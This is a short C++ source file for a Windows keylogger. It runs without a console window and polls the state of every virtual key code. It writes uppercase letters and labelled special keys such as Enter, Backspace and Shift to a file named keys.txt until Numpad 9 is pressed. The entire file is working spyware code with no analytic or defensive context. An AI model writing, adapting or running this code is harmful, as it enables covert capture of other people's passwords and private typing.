#include <Windows.h>
#include <fstream>

int WinMain(
	HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR lpCmdLine,
	int nShowCmd
)
{
	// My file get's created/opened
	std::ofstream MyFile("keys.txt");

	// While program runs
	while (!(GetAsyncKeyState(VK_NUMPAD9) & 0b1))
	{
		// Check each key (total 256 possibilities)
		for (int i = 0; i < 256; i++)
		{
			if (GetAsyncKeyState(i) & 0b1)
			{
				// Save regular key
				if (std::isupper(i))
				{
					MyFile << (char)i;
				}
				// Save special key
				else
				{
					switch (i)
					{
					case VK_ESCAPE: MyFile << "[ESCAPE]"; continue;
					case VK_RETURN: MyFile << "[ENTER]"; continue;
					case VK_SPACE: MyFile << "[SPACE]"; continue;
					case VK_BACK: MyFile << "[BACKSPACE]"; continue;
					case VK_TAB: MyFile << "[TAB]"; continue;
					case VK_CONTROL: MyFile << "[CTRL]"; continue;
					case VK_SHIFT: MyFile << "[SHIFT]"; continue;
					case VK_RSHIFT: MyFile << "[RSHIFT]"; continue;
					case VK_CAPITAL: MyFile << "[CapsLk]"; continue;
					default: continue;
					}
				}
				MyFile.flush();
			}
		}
		// Sleep to prevent high CPU ussage
		Sleep(100);
	}

	//When done, close the file
	MyFile.close();

	return 0;
}